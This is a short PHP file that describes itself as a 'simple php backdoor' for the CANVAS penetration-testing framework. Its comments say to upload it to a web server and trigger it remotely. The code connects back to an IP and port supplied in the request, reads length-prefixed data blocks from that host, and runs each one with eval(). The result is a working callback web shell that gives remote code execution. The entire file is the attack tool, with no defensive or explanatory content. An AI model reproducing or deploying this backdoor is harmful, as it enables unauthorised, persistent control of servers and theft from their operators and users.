<?php

/*
 * Simple php backdoor to execute a mosdef scriptnode call back
 * upload this to a path reachable with the web server and call upon it with the phpback_cli module.
 * 
 *
 */

$ip   = $_REQUEST['cb_ip'];
$port = $_REQUEST['cb_port'];

print "CANVAS_PHP";

function read_block($sock) 
{
	$data=fread($sock,4);
   	$size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3});
   	$data2="";
   	while ($size > 0 ) {
      		$data3=fread($sock,$size);
      		if ($data3==FALSE) {
         		break;
      		}
      		$data2=$data2.$data3;
      		$size-=strlen($data3);
   	} 
   	return $data2;
}

if(isset($ip) && isset($port))
{
	$f=fsockopen($ip,$port);

	if ($f) {
   		while (1) {
      			$data=read_block($f);
      			if ($data=="") {
       				break;
      			}
      			try {
       				eval($data);
        		}
      			catch (Exception $e) {
        		//ignore - probably all is lost, but we'll give it a shot.
        		}
   		}
 	}
}

?>
